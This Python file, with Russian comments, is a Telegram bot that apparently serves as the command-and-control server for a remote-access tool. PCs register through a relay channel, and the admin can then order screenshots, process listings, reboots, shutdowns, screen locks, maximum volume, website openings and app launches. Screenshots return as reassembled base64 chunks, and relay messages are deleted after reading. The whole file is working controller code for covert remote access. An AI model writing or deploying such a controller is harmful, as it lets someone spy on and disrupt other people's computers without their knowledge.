import asyncio
import os
import base64
import io
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")  # Токен БОТА №1 (Сервер)
ADMIN_ID = 5153650495  # Твой ID
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

connected_pcs = {}
# Буфер для сборки частей скриншотов {device_id: {part_index: text_data}}
screenshot_buffers = {}

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💻 Список устройств", callback_data="back_to_list")]])

def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer("🤖 Панель управления готова.", reply_markup=get_main_menu())

@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    await callback.message.edit_text("🤖 **Главное меню**", parse_mode="Markdown", reply_markup=get_main_menu())

@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    if not connected_pcs:
        await callback.message.edit_text("❌ Список устройств пуст.", reply_markup=get_main_menu())
        return
    keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
    await callback.message.edit_text("🎛 **Выберите устройство:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = connected_pcs.get(device_id)
    if not device_info: return
    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*", parse_mode="Markdown", reply_markup=get_device_menu(device_id))

@dp.callback_query(F.data.startswith("cat_"))
async def handle_categories(callback: types.CallbackQuery):
    # Универсальный обработчик подкатегорий меню
    data = callback.data.split("_")
    cat, dev_id = data[1], data[2]
    if cat == "mon":
        keyboard = [[InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{dev_id}")],
                    [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{dev_id}")],
                    [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{dev_id}")],
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]],
        text = "📊 **Мониторинг**"
    elif cat == "sys":
        keyboard = [[InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{dev_id}")],
                    [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{dev_id}")],
                    [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{dev_id}")],
                    [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{dev_id}")],
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]],
        text = "⚙️ **Система**"
    elif cat == "web":
        keyboard = [[InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{dev_id}")],
                    [InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{dev_id}")],
                    [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{dev_id}")],
                    [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{dev_id}")],
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]],
        text = "🌐 **Ресурсы**"
    elif cat == "util":
        keyboard = [[InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
                    [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
                    [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{dev_id}")],
                    [InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{dev_id}")],
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]],
        text = "🛠 **Утилиты**"
    else: return
    await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard[0] if isinstance(keyboard[0], list) and isinstance(keyboard[0][0], list) else keyboard))

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    _, cmd_type, device_id = callback.data.split("_", 2)
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
        await callback.answer("🚀 Команда отправлена!")
    except:
        await callback.answer("❌ Ошибка отправки.")

# --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---

@dp.channel_post(F.text.startswith("PING:"))
async def handle_channel_ping(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        if device_id not in connected_pcs:
            connected_pcs[device_id] = {"name": pc_name, "status": "online"}
            await bot.send_message(chat_id=ADMIN_ID, text=f"🆕 **ПК `{pc_name}` зарегистрирован!**", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
        elif connected_pcs[device_id].get("status") == "offline":
            connected_pcs[device_id]["status"] = "online"
            await bot.send_message(chat_id=ADMIN_ID, text=f"🟢 **ПК `{pc_name}` снова в сети!**", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
        else:
            connected_pcs[device_id] = {"name": pc_name, "status": "online"}
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("SCR_PART:"))
async def receive_screenshot_part(message: types.Message):
    """Сборка текстовых кусков скриншота Base64"""
    try:
        # Формат: SCR_PART:DEVICE_ID:ТЕКУЩАЯ_ЧАСТЬ:ВСЕГО_ЧАСТЕЙ:ДАННЫЕ
        _, device_id, part_num, total_parts, base64_chunk = message.text.split(":", 4)
        part_num = int(part_num)
        total_parts = int(total_parts)
        
        if device_id not in screenshot_buffers:
            screenshot_buffers[device_id] = {}
            
        screenshot_buffers[device_id][part_num] = base64_chunk
        await message.delete() # Удаляем технический кусок текста из канала
        
        # Если собрали абсолютно все части
        if len(screenshot_buffers[device_id]) == total_parts:
            pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
            
            # Собираем полную строку Base64 по порядку ключей
            full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
            del screenshot_buffers[device_id] # Очищаем оперативную память
            
            # Декодируем байты обратно в картинку
            image_bytes = base64.b64decode(full_base64)
            
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                caption=f"📸 Скриншот с ПК: *{pc_name}* (Собрано из текстовых пакетов)",
                parse_mode="Markdown",
                reply_markup=get_device_menu(device_id)
            )
    except: pass

@dp.channel_post(F.text.startswith("LOG_REPLY:"))
async def receive_channel_log(message: types.Message):
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        device_id = None
        for dev_id, info in connected_pcs.items():
            if info["name"] in text_data:
                device_id = dev_id
                break
        await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=get_device_menu(device_id) if device_id else None)
        await message.delete()
    except: pass

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
